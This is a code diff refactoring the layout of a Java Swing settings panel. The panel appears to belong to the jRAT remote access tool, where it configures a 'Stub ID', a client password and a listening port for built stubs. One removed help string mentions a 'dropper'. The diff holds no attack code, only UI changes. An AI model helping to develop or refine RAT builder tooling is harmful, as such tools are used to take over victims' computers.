@@ -21,6 +21,7 @@ import se.jrat.client.Help;
 import se.jrat.client.listeners.SocketComboBoxListener;
 import se.jrat.client.net.PortListener;
 import se.jrat.client.settings.Settings;
+import se.jrat.client.ui.components.JPlaceholderTextField;
 import se.jrat.client.ui.components.PortListenerJComboBox;
 
 
@@ -40,7 +41,6 @@ public class PanelBuildGeneral extends JPanel {
 	}
 
 	public PanelBuildGeneral() {
-
 		JPanel panel = new JPanel();
 		panel.setBorder(BorderFactory.createTitledBorder("Security"));
 
@@ -50,7 +50,8 @@ public class PanelBuildGeneral extends JPanel {
 		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addComponent(panel, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 430, Short.MAX_VALUE).addComponent(panel_1, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 430, Short.MAX_VALUE)).addContainerGap()));
 		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(Alignment.TRAILING, groupLayout.createSequentialGroup().addContainerGap().addComponent(panel, GroupLayout.DEFAULT_SIZE, 191, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.RELATED).addComponent(panel_1, GroupLayout.PREFERRED_SIZE, 81, GroupLayout.PREFERRED_SIZE).addContainerGap()));
 
-		txtID = new JTextField(Settings.getGlobal().getString("bid"));
+		txtID = new JPlaceholderTextField("Client");
+		txtID.setText(Settings.getGlobal().getString("bid"));
 		txtID.setColumns(10);
 
 		JLabel lblServerId = new JLabel("Stub ID");
@@ -98,13 +99,10 @@ public class PanelBuildGeneral extends JPanel {
 
 		JLabel lblSecurityPassword = new JLabel("Security Password");
 		lblSecurityPassword.setHorizontalAlignment(SwingConstants.TRAILING);
-		lblSecurityPassword.setBounds(10, 35, 133, 14);
 
 		passPass = new JPasswordField(Settings.getGlobal().getString("bpass"));
-		passPass.setBounds(147, 32, 174, 20);
 
 		JButton btnShowPassword = new JButton("Show password");
-		btnShowPassword.setBounds(147, 117, 107, 23);
 		btnShowPassword.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				JOptionPane.showMessageDialog(null, "Password: " + new String(passPass.getPassword()), "Show passwords", JOptionPane.INFORMATION_MESSAGE);
@@ -112,18 +110,12 @@ public class PanelBuildGeneral extends JPanel {
 		});
 
 		JButton button = new JButton("");
-		button.setBounds(147, 81, 37, 25);
 		button.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
-				Help.help("Encryption key for dropper, settings, and communication, needs to be 24 in length");
+				Help.help("Password to authenticate clients");
 			}
 		});
 		button.setIcon(new ImageIcon(PanelBuildGeneral.class.getResource("/icons/help.png")));
-		panel.setLayout(null);
-		panel.add(lblSecurityPassword);
-		panel.add(passPass);
-		panel.add(btnShowPassword);
-		panel.add(button);
 		setLayout(groupLayout);
 
 		comboBox = new PortListenerJComboBox(new SocketComboBoxListener() {
@@ -133,12 +125,48 @@ public class PanelBuildGeneral extends JPanel {
 			}
 		});
 
-		comboBox.setBounds(147, 146, 107, 20);
-		panel.add(comboBox);
-
 		JLabel lblLoad = new JLabel("Load");
 		lblLoad.setHorizontalAlignment(SwingConstants.TRAILING);
-		lblLoad.setBounds(10, 149, 133, 14);
-		panel.add(lblLoad);
+		GroupLayout gl_panel = new GroupLayout(panel);
+		gl_panel.setHorizontalGroup(
+			gl_panel.createParallelGroup(Alignment.LEADING)
+				.addGroup(gl_panel.createSequentialGroup()
+					.addGap(141)
+					.addComponent(btnShowPassword))
+				.addGroup(gl_panel.createSequentialGroup()
+					.addGap(4)
+					.addComponent(lblLoad, GroupLayout.PREFERRED_SIZE, 133, GroupLayout.PREFERRED_SIZE)
+					.addGap(4)
+					.addComponent(comboBox, GroupLayout.PREFERRED_SIZE, 107, GroupLayout.PREFERRED_SIZE))
+				.addGroup(gl_panel.createSequentialGroup()
+					.addGap(4)
+					.addComponent(lblSecurityPassword, GroupLayout.PREFERRED_SIZE, 133, GroupLayout.PREFERRED_SIZE)
+					.addGap(4)
+					.addGroup(gl_panel.createParallelGroup(Alignment.LEADING)
+						.addComponent(button, GroupLayout.PREFERRED_SIZE, 37, GroupLayout.PREFERRED_SIZE)
+						.addComponent(passPass, GroupLayout.PREFERRED_SIZE, 174, GroupLayout.PREFERRED_SIZE))
+					.addGap(103))
+		);
+		gl_panel.setVerticalGroup(
+			gl_panel.createParallelGroup(Alignment.LEADING)
+				.addGroup(gl_panel.createSequentialGroup()
+					.addGap(16)
+					.addGroup(gl_panel.createParallelGroup(Alignment.LEADING)
+						.addGroup(gl_panel.createSequentialGroup()
+							.addGap(3)
+							.addComponent(lblSecurityPassword))
+						.addComponent(passPass, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
+					.addPreferredGap(ComponentPlacement.RELATED)
+					.addComponent(button)
+					.addGap(34)
+					.addComponent(btnShowPassword)
+					.addGap(6)
+					.addGroup(gl_panel.createParallelGroup(Alignment.LEADING)
+						.addGroup(gl_panel.createSequentialGroup()
+							.addGap(3)
+							.addComponent(lblLoad))
+						.addComponent(comboBox, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)))
+		);
+		panel.setLayout(gl_panel);
 	}
 }
